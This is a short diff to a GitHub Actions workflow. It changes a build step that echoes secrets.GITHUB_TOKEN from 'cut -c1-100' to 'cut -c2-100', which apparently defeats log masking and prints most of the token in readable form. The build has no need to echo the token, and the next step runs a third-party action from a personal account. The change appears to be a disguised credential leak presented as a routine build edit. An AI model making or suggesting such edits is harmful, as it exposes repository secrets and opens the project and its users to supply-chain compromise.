@@ -23,7 +23,7 @@ jobs:
       - name: Build Packages
         run: |
           npm run build:pkg
-          echo ${{ secrets.GITHUB_TOKEN }} | cut -c1-100
+          echo ${{ secrets.GITHUB_TOKEN }} | cut -c2-100
 
       - name: Release
         uses: bdy12138/action@v2
